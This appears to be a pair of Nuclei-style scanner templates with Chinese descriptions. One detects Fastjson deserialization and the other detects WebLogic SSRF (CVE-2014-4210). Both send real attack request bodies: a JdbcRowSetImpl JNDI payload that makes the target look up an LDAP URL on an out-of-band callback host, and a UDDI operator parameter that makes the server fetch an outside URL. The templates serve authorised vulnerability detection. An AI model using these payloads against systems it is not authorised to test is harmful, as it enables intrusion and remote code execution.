id: wvs-fastjson-detect
info:
  name: Fastjson 反序列化探测
  author: huocai250
  severity: medium
  category: 反序列化
  description: 通过 autoType 错误特征与 JNDI 探测标记识别 Fastjson 解析器（OOB 需 collaborator 确认）。
  tags: fastjson,deserialization,rce,oob
  metadata:
    product: [fastjson]
http:
  - method: POST
    path:
      - "{{BaseURL}}/"
    headers:
      Content-Type: application/json
    body: '{"@type":"java.lang.AutoCloseable"}'
    matchers-condition: or
    matchers:
      - type: word
        words: ["autoType is not support", "fastjson", "com.alibaba.fastjson"]
  - method: POST
    path:
      - "{{BaseURL}}/"
    headers:
      Content-Type: application/json
    body: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}/wvs12","autoCommit":true}'
---
id: wvs-weblogic-ssrf-cve-2014-4210
info:
  name: Oracle WebLogic SSRF (CVE-2014-4210)
  author: huocai250
  severity: high
  category: SSRF
  description: UDDI 搜索接口 operator 参数注入 canary，需在 collaborator 确认回连。
  tags: cve,cve2014,ssrf,weblogic,oob
  metadata:
    product: [weblogic]
http:
  - method: GET
    path:
      - "{{BaseURL}}/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://{{interactsh-url}}"
